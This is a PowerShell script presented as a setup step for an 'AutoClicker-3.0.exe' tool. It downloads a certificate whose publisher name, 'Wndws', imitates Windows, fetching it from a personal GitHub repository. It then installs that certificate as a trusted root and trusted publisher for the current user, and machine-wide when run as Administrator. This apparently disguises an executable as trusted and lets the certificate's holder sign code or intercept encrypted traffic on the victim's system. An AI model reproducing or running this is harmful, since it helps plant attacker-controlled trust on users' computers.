# One-time: trust the Wndws publisher cert so AutoClicker-3.0.exe is not blocked locally.
#Requires -Version 5.1

$ErrorActionPreference = 'Stop'

$CerPath = Join-Path $PSScriptRoot 'Wndws.cer'
$PublisherSubject = 'CN=Wndws'

function Test-IsAdministrator {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Import-WndwsCertToStore {
    param(
        [string]$CerPath,
        [string]$StoreRoot,
        [string]$LeafStore
    )

    $rootPath = "$StoreRoot\Root"
    $leafPath = "$StoreRoot\$LeafStore"

    $existingRoot = Get-ChildItem $rootPath -ErrorAction SilentlyContinue |
        Where-Object { $_.Subject -eq $PublisherSubject } |
        Select-Object -First 1

    if (-not $existingRoot) {
        Import-Certificate -FilePath $CerPath -CertStoreLocation $rootPath | Out-Null
    }

    $existingPublisher = Get-ChildItem $leafPath -ErrorAction SilentlyContinue |
        Where-Object { $_.Subject -eq $PublisherSubject } |
        Select-Object -First 1

    if (-not $existingPublisher) {
        Import-Certificate -FilePath $CerPath -CertStoreLocation $leafPath | Out-Null
    }
}

if (-not (Test-Path -LiteralPath $CerPath)) {
    Write-Host 'Downloading Wndws.cer...' -ForegroundColor Cyan
    $url = 'https://raw.githubusercontent.com/JustValkz/Myst/main/Wndws.cer'
    Invoke-WebRequest -Uri $url -OutFile $CerPath -UseBasicParsing
}

Import-WndwsCertToStore -CerPath $CerPath -StoreRoot 'Cert:\CurrentUser' -LeafStore 'TrustedPublisher'
Write-Host 'Wndws certificate trusted for Current User (Root + Trusted Publisher).' -ForegroundColor Green

if (Test-IsAdministrator) {
    Import-WndwsCertToStore -CerPath $CerPath -StoreRoot 'Cert:\LocalMachine' -LeafStore 'TrustedPublisher'
    Write-Host 'Wndws certificate trusted for Local Machine (Root + Trusted Publisher).' -ForegroundColor Green
} else {
    Write-Host 'Re-run this script as Administrator to trust Wndws machine-wide.' -ForegroundColor Yellow
}

Write-Host 'You can now run AutoClicker-3.0.exe.' -ForegroundColor Green
